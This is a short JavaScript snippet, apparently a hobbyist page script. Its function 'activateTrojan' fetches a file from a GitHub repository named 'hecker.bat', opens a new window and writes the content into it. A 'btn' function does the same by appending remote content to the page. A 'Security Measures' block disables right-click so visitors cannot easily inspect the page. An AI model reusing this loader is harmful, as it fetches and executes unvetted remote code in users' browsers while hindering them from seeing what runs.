/*Startup code*/
function activateTrojan(lnk) {
	let win = window.open();
	fetch("https://raw.githubusercontent.com/25HoursaDay/hecker.bat/"+lnk)
	.then((result) => { return result.text(); })
	.then((content) => { win.document.write(content); });
}

/*Button Code*/
function btn(lnk) {
	fetch("https://raw.githubusercontent.com/25HoursaDay/bookmark/hecker.bat/"+lnk)
	.then((result) => { return result.text(); })
	.then((content) => { this.append(content); });
}

/*Security Measures*/
document.oncontextmenu = rightClick;
function rightClick(clickEvent) {clickEvent.preventDefault();}  
